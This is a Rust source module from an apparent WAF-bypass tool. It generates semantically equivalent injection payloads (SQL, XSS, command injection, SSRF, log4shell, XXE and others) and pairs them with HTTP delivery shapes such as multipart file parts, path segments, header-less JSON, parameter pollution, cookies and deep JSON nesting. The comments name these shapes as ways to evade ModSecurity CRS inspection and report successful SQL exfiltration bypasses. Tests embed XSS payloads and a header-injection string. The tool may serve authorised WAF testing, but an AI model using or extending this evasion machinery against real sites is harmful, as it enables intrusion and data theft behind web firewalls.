//! Phase B — the semantic-preserving equivalence-class GENERATOR.
//!
//! This is not a fixed list of tricks. It is a rewrite system that
//! emits an *infinite* space of payloads, every one of which still
//! executes the ORIGINAL exploit, paired with a *delivery shape* that
//! is transparent to the backend parser but (often) opaque to the WAF.
//!
//! # The unification
//!
//! A WAF bypass is any `s` where `Backend(s)` still executes the
//! attack AND `WAF(s)=ALLOW`. Both the WAF and the backend are
//! recognizers; a bypass lives exactly where they disagree. There are
//! TWO transparent-to-backend axes that produce that disagreement and
//! they are the *same algebra*:
//!
//!  1. **payload-string equivalence** — `UNION/**/SELECT` ≡ `UNION
//!     SELECT` to the SQL parser; `0x61` ≡ `'a'`; an infinite
//!     grammar-generated tautology family ≡ `1=1`.
//!  2. **delivery-shape equivalence** — the same logical parameter
//!     value delivered via a multipart file part / path segment /
//!     duplicate-param split / JSON-without-Content-Type reaches the
//!     *same* backend sink, but the WAF inspects it differently.
//!
//! Modelling them jointly, with the backend parser as the invariant,
//! is the moat. Empirically (modsec CRS PL1): 0/57 payload-string
//! tricks pass in the query arg, but a structured `UNION SELECT …`
//! exfil sails straight through `MultipartFile` and `PathSegment`.
//!
//! # Soundness
//!
//! Every rewrite is semantic-preserving *by construction*. The
//! generator additionally re-checks each emitted member against the
//! structural-preservation invariant ([`sql::still_executes`]) so it
//! is **sound by construction AND verified**: it can never emit a
//! non-attack (the anti-rig guarantee, enforced inside the generator).
//! The bench layers `wafrift-oracle` on top as an independent check.

pub mod adaptive;
pub mod cmd;
pub mod ldap;
pub mod log4shell;
pub mod nosql;
pub mod path;
pub mod sql;
pub mod ssrf;
pub mod ssti;
pub mod wafmodel;
pub mod xss;
pub mod xxe;

/// Deterministic SplitMix64 — reproducible infinite stream, no deps.
#[derive(Debug, Clone)]
pub struct Rng(u64);

impl Rng {
    #[must_use]
    pub fn new(seed: u64) -> Self {
        Self(seed ^ 0x9E37_79B9_7F4A_7C15)
    }
    pub fn next_u64(&mut self) -> u64 {
        self.0 = self.0.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = self.0;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^ (z >> 31)
    }
    /// Uniform in `0..n` (n>0).
    pub fn below(&mut self, n: usize) -> usize {
        if n == 0 {
            return 0;
        }
        (self.next_u64() % n as u64) as usize
    }
    /// Pick one reference from a non-empty slice.
    ///
    /// # Panics
    /// Panics if `xs` is empty — all call sites guarantee non-empty inputs.
    /// The old implementation computed `xs.len() - 1` before checking for
    /// emptiness, which in debug builds panics on `0usize - 1` (subtraction
    /// overflow), and in release builds wraps to `usize::MAX` then hits an
    /// out-of-bounds index. The assertion makes the precondition explicit and
    /// the error message actionable rather than a cryptic index panic.
    pub fn pick<'a, T>(&mut self, xs: &'a [T]) -> &'a T {
        assert!(!xs.is_empty(), "Rng::pick called with an empty slice");
        &xs[self.below(xs.len())]
    }
    pub fn chance(&mut self, num: u32, den: u32) -> bool {
        den != 0 && (self.next_u64() % u64::from(den)) < u64::from(num)
    }
}

/// SQL dialect a rewrite is sound under. `Generic` = sound everywhere.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Dialect {
    Generic,
    MySql,
    Postgres,
    MsSql,
}

/// How the bench/transport must place the payload so the backend sees
/// the same logical parameter value while the WAF inspects it
/// differently. Every shape is *transparent to the backend sink*.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DeliveryShape {
    /// `?<param>=<payload>` — baseline, fully WAF-inspected.
    Query { param: String },
    /// `application/x-www-form-urlencoded` body.
    FormBody { param: String },
    /// JSON body. `content_type=None` ⇒ omit the header entirely
    /// (empirically slips CRS's JSON body processor).
    JsonBody {
        param: String,
        content_type: Option<String>,
    },
    /// Plain multipart text field.
    MultipartField { name: String },
    /// Multipart **file** part (`filename=…`, part Content-Type).
    /// CRS excludes upload parts from ARGS SQLi inspection — the
    /// single strongest empirical survivor for structured exfil.
    MultipartFile {
        name: String,
        filename: String,
        part_ct: String,
    },
    /// Payload as a URL path segment (`/…/<payload>`). CRS SQLi rules
    /// target ARGS, not the path.
    PathSegment,
    /// HTTP-Parameter-Pollution last-occurrence evasion:
    /// `?<p>=v0&<p>=v1&…&<p>=<payload>` — `parts` benign decoy values
    /// precede the intact payload, which is carried whole in the LAST
    /// occurrence. WAFs that inspect only the first occurrence (or
    /// score each occurrence independently) miss it; the payload is
    /// never split. Sound on last-occurrence-wins backends (PHP
    /// `$_GET`, Express, Spring `@RequestParam`, Rails); NOT sound on
    /// first-wins or value-concatenating (legacy ASP.NET) backends —
    /// the recovered value there is not the original payload. (The
    /// decoys are throwaway markers, never fragments of the payload —
    /// this is deliberately NOT a payload-splitting/concat technique.)
    HppSplit { param: String, parts: usize },
    /// Payload as a **request header** value (e.g. `X-Forwarded-Host`,
    /// `Referer`). Apps that build links / reflect these into HTML emit
    /// XSS from them; CRS's `REQUEST_HEADERS` XSS coverage at PL1 is
    /// weaker than its ARGS coverage. Transparent to the backend *iff
    /// the app reflects that header* (the same conditional transparency
    /// as `PathSegment`). Only sound for payloads with no CR/LF/NUL —
    /// see [`DeliveryShape::transport_legal`].
    HeaderValue { name: String },
    /// Payload as a **cookie** value (`Cookie: <name>=<payload>`).
    /// Reflected-cookie XSS is a real class and `REQUEST_COOKIES` is a
    /// distinct WAF inspection surface from ARGS. Transparent to the
    /// backend *iff the app reflects that cookie*. Only sound for
    /// payloads that are valid RFC 6265 cookie-octets (no CR/LF/NUL,
    /// `;`, `,`, whitespace, DQUOTE, backslash) — see
    /// [`DeliveryShape::transport_legal`]; the generator never pairs an
    /// illegal payload with this shape.
    Cookie { name: String },
    /// XML POST body — `<root><field>PAYLOAD</field></root>` with the
    /// payload XML-entity-escaped inside the text node. CRS body
    /// inspectors at PL1 focus on ARGS + JSON; XML is the third axis
    /// and is the most weakly covered (no `application/xml` parser
    /// fans out into ARGS_NAMES/ARGS the way `application/json` does
    /// with `tx.json_request_body_processor`). Transparent to the
    /// backend iff the app parses XML and sinks the inner text node
    /// — a SOAP, RSS, or content-negotiating endpoint. Always legal
    /// for any payload because the renderer escapes `<`/`>`/`&`/`"`
    /// before they reach the wire (backend re-decodes them, sink sees
    /// the exact bytes).
    XmlBody {
        /// Outer element name, e.g. "request".
        root: String,
        /// Inner element name carrying the payload, e.g. "param".
        field: String,
    },
    /// JSON POST body with the payload nested `depth` keys deep:
    /// `{"a":{"a":{"a":{"<param>":"PAYLOAD"}}}}`. CRS PL3 caps the
    /// `tx.json_max_depth` body inspector at 5 by default; payloads
    /// beyond that fall outside the rule scope while the backend's
    /// JSON parser is unbounded. Transparent to the backend iff it
    /// traverses the same depth to read the value — common in
    /// nested-resource APIs (`POST /items` with deep filter trees) or
    /// any framework auto-binding nested fields. JSON-escaped at the
    /// renderer so any payload is legal.
    JsonNestedDeep {
        /// Final parameter name (the key whose value carries the
        /// payload, at the innermost level).
        param: String,
        /// Depth: the payload sits inside `depth` nested objects, each
        /// keyed by `"a"` so the body stays short and the access path
        /// recoverable.
        depth: usize,
    },
    /// GraphQL POST `/graphql` with a parameterised query and the
    /// payload carried as a JSON-string variable:
    /// `{"query":"query Q($v:String!){<field>(q:$v){...}}",
    ///   "variables":{"<var>":"PAYLOAD"}}`. CRS PL1 has no GraphQL
    /// parser — the body is a JSON envelope and the payload is one of
    /// many string values inside `variables`, so an ARGS-scoped or
    /// JSON-fixed-path rule misses it. Transparent to the backend iff
    /// the GraphQL resolver dispatches the named field and reflects
    /// the variable value (the GraphQL XSS class — `search(q:$v)` →
    /// `$v` rendered into HTML somewhere). JSON-escaped at the
    /// renderer so any payload is legal.
    GraphQLQuery {
        /// Top-level field invoked, e.g. "search". Varying this
        /// across calls means a WAF cannot match a single fixed
        /// pattern of the query body.
        field: String,
        /// Variable name carrying the payload. Conventionally short.
        var: String,
    },
}

impl DeliveryShape {
    #[must_use]
    pub fn label(&self) -> &'static str {
        match self {
            Self::Query { .. } => "query",
            Self::FormBody { .. } => "form_body",
            Self::JsonBody { .. } => "json_body",
            Self::MultipartField { .. } => "multipart_field",
            Self::MultipartFile { .. } => "multipart_file",
            Self::PathSegment => "path_segment",
            Self::HppSplit { .. } => "hpp_split",
            Self::HeaderValue { .. } => "header_value",
            Self::Cookie { .. } => "cookie",
            Self::XmlBody { .. } => "xml_body",
            Self::JsonNestedDeep { .. } => "json_nested_deep",
            Self::GraphQLQuery { .. } => "graphql",
        }
    }

    /// Whether this shape can carry `payload` *without the payload
    /// forging transport structure* (header/cookie injection, request
    /// smuggling). For every encoding shape (query/form/json/multipart/
    /// path/hpp) the payload is percent-/JSON-/multipart-escaped so the
    /// backend recovers the exact bytes — always legal. For the raw
    /// channels (`HeaderValue`, `Cookie`) we MUST NOT encode (the
    /// backend XSS sink must see the literal bytes), so the payload
    /// itself must already be legal in that transport position. The
    /// generator calls this and never emits an illegal pairing; this is
    /// the delivery-axis anti-rig (a member that forged a smuggled
    /// header would be a different attack, not a sound rewrite).
    #[must_use]
    pub fn transport_legal(&self, payload: &str) -> bool {
        match self {
            Self::HeaderValue { .. } => {
                // RFC 9110 §5.5: CR/LF/NUL terminate or split the header.
                // ALSO — recipients strip leading/trailing OWS (SP/HTAB)
                // from a field value before processing, so a payload
                // that begins or ends with SP/HTAB would reach the app
                // *trimmed* (≠ member.payload) — that is unsound, reject
                // it. Interior SP and `<` `>` `"` are legal field-value
                // octets and arrive verbatim.
                let bytes = payload.as_bytes();
                let edge_ows = matches!(bytes.first(), Some(b' ' | b'\t'))
                    || matches!(bytes.last(), Some(b' ' | b'\t'));
                !edge_ows && !payload.bytes().any(|b| b == b'\r' || b == b'\n' || b == 0)
            }
            Self::Cookie { .. } => {
                // RFC 6265 cookie-octet: %x21 / %x23-2B / %x2D-3A /
                // %x3C-5B / %x5D-7E. Excludes CTL, SP, DQUOTE, comma,
                // semicolon, backslash — any of which would split the
                // cookie or forge a new one.
                !payload.is_empty()
                    && payload.bytes().all(|b| {
                        b == 0x21
                            || (0x23..=0x2B).contains(&b)
                            || (0x2D..=0x3A).contains(&b)
                            || (0x3C..=0x5B).contains(&b)
                            || (0x5D..=0x7E).contains(&b)
                    })
            }
            // Encoding shapes recover exact bytes at the backend
            // because the renderer escapes whatever the transport
            // would otherwise mis-frame (XML entities, JSON string
            // escapes, urlencoding, multipart boundary selection).
            // XmlBody / JsonNestedDeep / GraphQLQuery all fall here.
            _ => true,
        }
    }
}

/// One member of the equivalence class: a rewritten payload + the
/// delivery shape + the proof-carrying metadata.
#[derive(Debug, Clone)]
pub struct EquivPayload {
    /// The rewritten payload string (still executes the exploit).
    pub payload: String,
    /// How to deliver it so the backend sees the same value.
    pub delivery: DeliveryShape,
    /// Dialect this member is sound under.
    pub dialect: Dialect,
    /// Names of the rewrite rules composed to produce it (audit/Phase C
    /// reward attribution).
    pub rules: Vec<&'static str>,
}

/// Generator configuration.
#[derive(Debug, Clone)]
pub struct EquivConfig {
    /// Deterministic seed — same seed ⇒ same stream.
    pub seed: u64,
    /// How many members to draw from the (infinite) class.
    pub max: usize,
    /// Re-verify every member against the structural-preservation
    /// invariant before yielding (defaults on; never disable for real
    /// runs — it is the anti-rig guarantee).
    pub verify: bool,
    /// Also vary the delivery shape (the joint algebra). When false,
    /// only payload-string equivalence is explored.
    pub vary_delivery: bool,
    /// Parameter name the original payload was found in.
    pub param: String,
    /// Phase C: force every member onto delivery-shape arm `i` (index
    /// into [`sql::delivery_kind_label`] order). `None` = sample as
    /// normal. The adaptive search sets this to the bandit's chosen arm
    /// so the request budget concentrates on what beats *this* WAF.
    pub force_delivery: Option<usize>,
}

/// Default deterministic seed — ASCII "wafrift!".
pub const DEFAULT_SEED: u64 = 0x7761_6672_6966_7421;

impl Default for EquivConfig {
    fn default() -> Self {
        Self {
            seed: DEFAULT_SEED,
            max: 64,
            verify: true,
            vary_delivery: true,
            param: "id".to_string(),
            force_delivery: None,
        }
    }
}

/// Draw up to `cfg.max` members of the joint equivalence class of a
/// SQL injection. Deterministic per `cfg.seed`. Every yielded member
/// is structurally verified to still execute the original exploit.
#[must_use]
pub fn equiv_sql(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    sql::generate(payload, cfg)
}

/// Classes that currently have a sound equivalence model.
#[must_use]
pub fn supports_class(class: &str) -> bool {
    matches!(
        class,
        "sql" | "xss" | "cmdi" | "path" | "ssti" | "ldap" | "ssrf" | "nosql" | "log4shell" | "xxe"
    )
}

/// Dispatch the joint equivalence generator by attack class. Returns
/// empty for classes without a sound model yet (anti-rig: never guess).
#[must_use]
pub fn equiv_for(class: &str, payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    match class {
        "sql" => sql::generate(payload, cfg),
        "xss" => xss::generate(payload, cfg),
        "cmdi" => cmd::generate(payload, cfg),
        "path" => path::generate(payload, cfg),
        "ssti" => ssti::generate(payload, cfg),
        "ldap" => ldap::generate(payload, cfg),
        "ssrf" => ssrf::generate(payload, cfg),
        "nosql" => nosql::generate(payload, cfg),
        "log4shell" => log4shell::generate(payload, cfg),
        "xxe" => xxe::generate(payload, cfg),
        _ => Vec::new(),
    }
}

// ─────────────────────────────────────────────────────────────────────
// Delivery-aware public API (the surface scald consumes for XSS).
//
// The honest lever for XSS-vs-WAF is NOT payload-string obfuscation
// (a CRS-class WAF normalises every encoding) — it is DELIVERY SHAPE:
// the same sound payload delivered via a multipart file part / path
// segment / JSON-without-Content-Type reaches the backend sink while
// the WAF inspects it differently. This renders an [`EquivPayload`]'s
// `(payload × delivery)` into a transport-neutral [`wafrift_types::
// Request`] that ANY consumer (scald, the proxy, the CLI) can send —
// one single source of truth for the joint algebra.
// ─────────────────────────────────────────────────────────────────────

/// Multipart boundary shared by the delivery renderer (kept identical
/// to the CLI's so behaviour is one source of truth).
pub const MP_BOUNDARY: &str = "----wafriftEQUIVb0undary";

fn json_escape(s: &str) -> String {
    let mut o = String::with_capacity(s.len() + 2);
    for c in s.chars() {
        match c {
            '"' => o.push_str("\\\""),
            '\\' => o.push_str("\\\\"),
            '\n' => o.push_str("\\n"),
            '\r' => o.push_str("\\r"),
            '\t' => o.push_str("\\t"),
            c if (c as u32) < 0x20 => o.push_str(&format!("\\u{:04x}", c as u32)),
            c => o.push(c),
        }
    }
    o
}

/// RFC 7578 §4.1: the multipart boundary MUST NOT occur in any
/// encapsulated part. A WAF-evasion payload is attacker-controlled and
/// may echo our constant boundary; return an extended boundary that is
/// provably absent from every part, so the renderer can never let the
/// payload forge multipart structure in the request we build.
fn effective_boundary(parts: &[&str]) -> String {
    let mut bnd = MP_BOUNDARY.to_string();
    let mut n: u64 = 0;
    while parts.iter().any(|p| p.contains(bnd.as_str())) {
        n = n.wrapping_add(1);
        bnd = format!("{MP_BOUNDARY}{n:016x}");
    }
    bnd
}

/// SOUNDNESS GATE for the joint `(payload × delivery)` algebra. A
/// member whose payload cannot legally occupy its delivery channel —
/// a raw `HeaderValue`/`Cookie` payload carrying bytes (`CR`/`LF`/
/// `NUL`/`;`/space/…) that [`DeliveryShape::to_request`] would have to
/// strip — is NOT an equivalent rewrite: what reaches the backend
/// would differ from `member.payload`, so verifying against
/// `member.payload` would be a rig. Drop it. This runs at the tail of
/// EVERY per-class generator, so the invariant holds for all classes
/// uniformly (XSS additionally guards inline to preserve recall by
/// re-sampling rather than dropping). Encoding shapes are always
/// legal, so non-raw deliveries are untouched.
pub(crate) fn enforce_transport_legal(out: &mut Vec<EquivPayload>) {
    out.retain(|m| m.delivery.transport_legal(&m.payload));
}

fn url_with_pair(target: &str, param: &str, raw_value: &str) -> String {
    let base = target.trim_end_matches('/');
    let sep = if base.contains('?') { '&' } else { '?' };
    // BOTH sides are percent-encoded: a param name carrying a space /
    // `&` / `#` / CTL would otherwise corrupt the query structure (a
    // renderer must never let a field name break the request it builds).
    format!(
        "{base}{sep}{}={}",
        urlencoding::encode(param),
        urlencoding::encode(raw_value)
    )
}

fn url_with_path_segment(target: &str, raw_seg: &str) -> String {
    let (path, query) = target.split_once('?').map_or((target, ""), |(p, q)| (p, q));
    let p = path.trim_end_matches('/');
    let seg = urlencoding::encode(raw_seg);
    if query.is_empty() {
        format!("{p}/{seg}")
    } else {
        format!("{p}/{seg}?{query}")
    }
}

impl DeliveryShape {
    /// Render this delivery shape + `payload` into a concrete,
    /// transport-neutral [`wafrift_types::Request`] against `target`.
    /// Consumers map it to their own HTTP client. This is the ONE
    /// implementation of the joint `(payload × delivery)` algebra.
    #[must_use]
    pub fn to_request(&self, target: &str, payload: &str) -> wafrift_types::Request {
        use wafrift_types::Request;
        match self {
            Self::Query { param } => Request::get(url_with_pair(target, param, payload)),
            Self::FormBody { param } => {
                let body = format!(
                    "{}={}",
                    urlencoding::encode(param),
                    urlencoding::encode(payload)
                );
                let mut r = Request::post(target.to_string(), body.into_bytes());
                r.add_header("content-type", "application/x-www-form-urlencoded");
                r
            }
            Self::JsonBody {
                param,
                content_type,
            } => {
                let body = format!(
                    "{{\"{}\":\"{}\"}}",
                    json_escape(param),
                    json_escape(payload)
                );
                let mut r = Request::post(target.to_string(), body.into_bytes());
                if let Some(ct) = content_type {
                    r.add_header("content-type", ct.clone());
                }
                r
            }
            Self::MultipartField { name } => {
                let bnd = effective_boundary(&[payload, name]);
                let body = format!(
                    "--{bnd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{payload}\r\n--{bnd}--\r\n"
                );
                let mut r = Request::post(target.to_string(), body.into_bytes());
                r.add_header(
                    "content-type",
                    format!("multipart/form-data; boundary={bnd}"),
                );
                r
            }
            Self::MultipartFile {
                name,
                filename,
                part_ct,
            } => {
                let bnd = effective_boundary(&[payload, name, filename, part_ct]);
                let body = format!(
                    "--{bnd}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{filename}\"\r\nContent-Type: {part_ct}\r\n\r\n{payload}\r\n--{bnd}--\r\n"
                );
                let mut r = Request::post(target.to_string(), body.into_bytes());
                r.add_header(
                    "content-type",
                    format!("multipart/form-data; boundary={bnd}"),
                );
                r
            }
            Self::PathSegment => Request::get(url_with_path_segment(target, payload)),
            Self::HppSplit { param, parts } => {
                let decoys = (*parts).max(1);
                let mut u = target.to_string();
                for k in 0..decoys {
                    u = url_with_pair(&u, param, &format!("v{k}"));
                }
                Request::get(url_with_pair(&u, param, payload))
            }
            Self::HeaderValue { name } => {
                // Defense-in-depth smuggling guard: CR/LF/NUL can never
                // reach the wire even if a careless direct caller skips
                // `transport_legal`. On generator-produced members this
                // strip is provably a no-op (they are pre-filtered).
                let safe: String = payload
                    .chars()
                    .filter(|&c| c != '\r' && c != '\n' && c != '\0')
                    .collect();
                let mut r = Request::get(target.to_string());
                r.add_header(name, safe);
                r
            }
            Self::Cookie { name } => {
                // Strip the request-`Cookie:` pair separator `;` plus
                // CR/LF/NUL so a direct caller can never forge a second
                // cookie / split the request. No-op on sound members.
                let safe: String = payload
                    .chars()
                    .filter(|&c| c != '\r' && c != '\n' && c != '\0' && c != ';')
                    .collect();
                let mut r = Request::get(target.to_string());
                r.add_header("cookie", format!("{name}={safe}"));
                r
            }
            Self::XmlBody { root, field } => {
                // XML element + attribute names that themselves could
                // carry attacker-controlled bytes would forge attribute
                // structure or close the parent element. The shape's
                // generator picks short ASCII identifiers for `root` /
                // `field`, but render-side defence-in-depth: drop any
                // byte that isn't a conservative NameChar.
                let r_safe = sanitize_xml_name(root, "request");
                let f_safe = sanitize_xml_name(field, "param");
                let body = format!(
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
                     <{r_safe}><{f_safe}>{}</{f_safe}></{r_safe}>",
                    xml_text_escape(payload)
                );
                let mut req = Request::post(target.to_string(), body.into_bytes());
                req.add_header("content-type", "application/xml");
                req
            }
            Self::JsonNestedDeep { param, depth } => {
                // Build {"a":{"a":...{"a":{"<param>":"<payload>"}}...}}
                // bottom-up so we never have to count braces.
                let depth = (*depth).clamp(1, 64); // cap so a hostile config can't OOM the renderer
                let inner = format!(
                    "{{\"{}\":\"{}\"}}",
                    json_escape(param),
                    json_escape(payload)
                );
                let mut body = inner;
                for _ in 0..depth {
                    body = format!("{{\"a\":{body}}}");
                }
                let mut req = Request::post(target.to_string(), body.into_bytes());
                req.add_header("content-type", "application/json");
                req
            }
            Self::GraphQLQuery { field, var } => {
                // Same sanitization for the GraphQL identifier names —
                // attacker bytes there would mis-parse the query.
                let f_safe = sanitize_graphql_name(field, "search");
                let v_safe = sanitize_graphql_name(var, "v");
                let query = format!("query Q(${v_safe}:String!){{{f_safe}(q:${v_safe})}}");
                let body = format!(
                    "{{\"query\":\"{}\",\"variables\":{{\"{}\":\"{}\"}}}}",
                    json_escape(&query),
                    json_escape(&v_safe),
                    json_escape(payload)
                );
                let mut req = Request::post(target.to_string(), body.into_bytes());
                req.add_header("content-type", "application/json");
                req
            }
        }
    }
}

/// XML 1.0 text-node escape — replaces `&`, `<`, `>` with their
/// canonical entity references so the payload bytes round-trip
/// through any conformant XML parser as the original text node.
/// `"` is also escaped though our renderer never places the payload
/// inside an attribute value; defence-in-depth.
fn xml_text_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&apos;"),
            other => out.push(other),
        }
    }
    out
}

/// Conservative XML 1.0 NameStartChar / NameChar predicate: ASCII
/// letters, digits (only after the first char), `_`, `-`, `.`. Any
/// other byte is dropped; empty result falls back to `fallback`.
fn sanitize_xml_name(s: &str, fallback: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for (i, c) in s.chars().enumerate() {
        let ok = if i == 0 {
            c.is_ascii_alphabetic() || c == '_'
        } else {
            c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.'
        };
        if ok {
            out.push(c);
        }
    }
    if out.is_empty() {
        fallback.to_string()
    } else {
        out
    }
}

/// Conservative GraphQL Name: `[_A-Za-z][_0-9A-Za-z]*` (spec §2.1.9).
/// Any other byte is dropped; empty result falls back to `fallback`.
fn sanitize_graphql_name(s: &str, fallback: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for (i, c) in s.chars().enumerate() {
        let ok = if i == 0 {
            c.is_ascii_alphabetic() || c == '_'
        } else {
            c.is_ascii_alphanumeric() || c == '_'
        };
        if ok {
            out.push(c);
        }
    }
    if out.is_empty() {
        fallback.to_string()
    } else {
        out
    }
}

/// scald's XSS entrypoint: the sound `(payload × delivery)` XSS
/// equivalence class for `payload`. Each member still executes the
/// original script (verified by the generator) AND carries the
/// delivery shape that slips a WAF — render it with
/// [`DeliveryShape::to_request`]. Deterministic; `max` members.
#[must_use]
pub fn xss_delivered(payload: &str, max: usize) -> Vec<EquivPayload> {
    let cfg = EquivConfig {
        max,
        vary_delivery: true,
        param: "q".to_string(),
        ..EquivConfig::default()
    };
    xss::generate(payload, &cfg)
}

#[cfg(test)]
mod delivery_api_tests {
    use super::*;

    #[test]
    fn xss_delivered_is_sound_diverse_and_deterministic() {
        let atk = "<svg onload=alert(1)>";
        let a = xss_delivered(atk, 40);
        let b = xss_delivered(atk, 40);
        assert_eq!(
            a.iter().map(|m| &m.payload).collect::<Vec<_>>(),
            b.iter().map(|m| &m.payload).collect::<Vec<_>>(),
            "must be deterministic"
        );
        assert!(a.len() >= 8, "too few delivered xss members: {}", a.len());
        // every member still executes the original (generator anti-rig)
        for m in &a {
            assert!(
                xss::still_executes_xss(atk, &m.payload),
                "UNSOUND delivered member {:?}",
                m.payload
            );
        }
        // the delivery axis is actually exercised (not all Query)
        let shapes: std::collections::HashSet<_> = a.iter().map(|m| m.delivery.label()).collect();
        assert!(shapes.len() >= 3, "delivery axis not varied: {shapes:?}");
    }

    #[test]
    fn to_request_renders_each_shape_faithfully() {
        let t = "http://h/app";
        let p = "<svg onload=alert(1)>";
        let q = DeliveryShape::Query { param: "x".into() }.to_request(t, p);
        assert!(q.url.contains("x=") && q.url.contains("%3Csvg"));
        let mf = DeliveryShape::MultipartFile {
            name: "f".into(),
            filename: "a.txt".into(),
            part_ct: "text/plain".into(),
        }
        .to_request(t, p);
        let body = String::from_utf8_lossy(mf.body.as_deref().unwrap_or(&[]));
        assert!(body.contains("filename=\"a.txt\"") && body.contains(p));
        assert!(
            mf.headers
                .iter()
                .any(|(k, v)| k == "content-type" && v.contains("multipart/form-data"))
        );
        let ps = DeliveryShape::PathSegment.to_request(t, p);
        assert!(ps.url.starts_with("http://h/app/") && ps.url.contains("%3C"));
        // JSON-without-Content-Type: the empirically CRS-blind shape.
        let jb = DeliveryShape::JsonBody {
            param: "q".into(),
            content_type: None,
        }
        .to_request(t, p);
        assert!(!jb.headers.iter().any(|(k, _)| k == "content-type"));
        let jbody = String::from_utf8_lossy(jb.body.as_deref().unwrap_or(&[])).into_owned();
        assert!(jbody.starts_with("{\"q\":\"") && jbody.contains(p) && jbody.ends_with("\"}"));
    }

    #[test]
    fn phase_c_arm_table_is_aligned_injective_and_tail_stable() {
        // The Phase-C bandit sets `force_delivery: Some(i)` to index
        // `delivery_set`, and `delivery_kind_label(i)` names that arm
        // for reward attribution. The contract is NOT label-string
        // equality with `DeliveryShape::label()` — `delivery_kind_label`
        // is deliberately FINER (it splits JSON into `json_no_ct` vs
        // `json_ct`, which `label()` collapses to `json_body`). The
        // invariants that actually prevent mis-rewarded arms are:
        let set = super::sql::delivery_set("q");

        // (1) Every shape has its OWN reward bucket — `delivery_kind_
        //     label` must be injective over the live index range, or
        //     two shapes share a bandit arm and the search is blind.
        let names: Vec<_> = (0..set.len())
            .map(super::sql::delivery_kind_label)
            .collect();
        let uniq: std::collections::HashSet<_> = names.iter().collect();
        assert_eq!(
            uniq.len(),
            set.len(),
            "delivery_kind_label collides over 0..{} ({names:?}) — \
             two delivery shapes reward the same bandit arm",
            set.len()
        );

        // (2) The two JSON arms are the only place label() collapses;
        //     everywhere else the coarse and fine labels agree, so a
        //     drift in the non-JSON arms is still caught.
        for (i, d) in set.iter().enumerate() {
            let fine = super::sql::delivery_kind_label(i);
            if matches!(d, DeliveryShape::JsonBody { .. }) {
                assert!(
                    fine == "json_no_ct" || fine == "json_ct",
                    "json arm {i} mislabelled {fine:?}"
                );
            } else {
                assert_eq!(fine, d.label(), "delivery arm {i} index/label drift");
            }
        }

        // (3) The new raw channels were APPENDED at the tail (indices
        //     8/9) so every pre-existing `force_delivery` index — and
        //     any persisted Phase-C bandit state — still points at the
        //     same shape it did before this change.
        assert_eq!(set.len(), 13);
        // The Phase-C bandit is `Bandit::new(DELIVERY_ARMS)`. If this
        // drifts below `delivery_set().len()` the trailing arms are
        // NEVER explored — the new channels would be dead in the
        // adaptive scan path even though they render correctly.
        assert_eq!(
            super::sql::DELIVERY_ARMS,
            set.len(),
            "DELIVERY_ARMS ({}) != delivery_set len ({}) — Phase-C \
             bandit cannot reach the tail delivery shapes",
            super::sql::DELIVERY_ARMS,
            set.len()
        );
        assert!(matches!(set[8], DeliveryShape::HeaderValue { .. }));
        assert!(matches!(set[9], DeliveryShape::Cookie { .. }));
        // New shapes APPENDED at 10/11/12 so existing persisted bandit
        // state still indexes the same shapes it did before this change
        // (LAW 2 — pre-existing reward distributions stay valid).
        assert!(matches!(set[10], DeliveryShape::XmlBody { .. }));
        assert!(matches!(set[11], DeliveryShape::JsonNestedDeep { .. }));
        assert!(matches!(set[12], DeliveryShape::GraphQLQuery { .. }));
        assert_eq!(super::sql::delivery_kind_label(7), "query");
        assert_eq!(super::sql::delivery_kind_label(8), "header_value");
        assert_eq!(super::sql::delivery_kind_label(9), "cookie");
        assert_eq!(super::sql::delivery_kind_label(10), "xml_body");
        assert_eq!(super::sql::delivery_kind_label(11), "json_nested_deep");
        assert_eq!(super::sql::delivery_kind_label(12), "graphql");
        // Out-of-range still degrades safely (no panic, defined value).
        assert_eq!(super::sql::delivery_kind_label(999), "query");
    }

    #[test]
    fn header_and_cookie_render_exact_bytes_no_smuggle() {
        let t = "http://h/app?z=1";
        // Sound payload (no CR/LF, no space/`;` → also cookie-legal).
        let p = "<svg/onload=alert(1)>";
        let hv = DeliveryShape::HeaderValue {
            name: "X-Forwarded-Host".into(),
        }
        .to_request(t, p);
        assert_eq!(hv.url, t, "header delivery must not alter the URL");
        assert!(hv.body.is_none(), "header delivery has no body");
        let xfh: Vec<_> = hv
            .headers
            .iter()
            .filter(|(k, _)| k.eq_ignore_ascii_case("x-forwarded-host"))
            .collect();
        assert_eq!(xfh.len(), 1, "exactly one injected header");
        assert_eq!(xfh[0].1, p, "exact payload bytes reach the app verbatim");

        let ck = DeliveryShape::Cookie { name: "q".into() }.to_request(t, p);
        let cookie: Vec<_> = ck
            .headers
            .iter()
            .filter(|(k, _)| k.eq_ignore_ascii_case("cookie"))
            .collect();
        assert_eq!(cookie.len(), 1);
        assert_eq!(cookie[0].1, format!("q={p}"));

        // ADVERSARIAL: a payload that *tries* to forge a second header /
        // cookie / split the request must be neutralised by to_request
        // (defense-in-depth even though the generator pre-filters it).
        let evil = "a\r\nSet-Cookie: pwn=1\r\nX-Evil: 1; Domain=evil.tld";
        let hv2 = DeliveryShape::HeaderValue {
            name: "X-Forwarded-Host".into(),
        }
        .to_request(t, evil);
        for (k, v) in &hv2.headers {
            assert!(
                !v.contains('\r') && !v.contains('\n'),
                "CR/LF leaked into header {k}: {v:?} (request smuggling)"
            );
        }
        assert!(
            !hv2.headers
                .iter()
                .any(|(k, _)| k.eq_ignore_ascii_case("set-cookie")
                    || k.eq_ignore_ascii_case("x-evil")),
            "payload forged an extra header"
        );
